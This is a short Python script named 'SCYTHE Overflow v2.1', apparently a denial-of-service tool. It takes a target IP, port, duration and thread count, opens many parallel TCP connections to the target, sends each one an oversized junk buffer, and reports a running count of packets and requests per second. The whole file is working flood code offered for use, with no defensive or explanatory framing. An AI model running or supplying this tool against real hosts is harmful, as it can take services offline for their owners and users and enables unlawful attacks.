# SCYTHE Overflow v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 5: print('Usage: python3 overflow.py <ip> <port> <time> <threads>'); sys.exit(1)
ip, port, duration, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
print(f'[SCYTHE] Overflow: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(2); s.connect((ip, port))
      s.send(b'A' * 65535 + b'\x00' * 1000 + b'\n\n' * 100)
      s.close();
      with lock: total += 1
    except: pass
for _ in range(threads):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[OVERFLOW] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[OVERFLOW] Completed: {total} packets')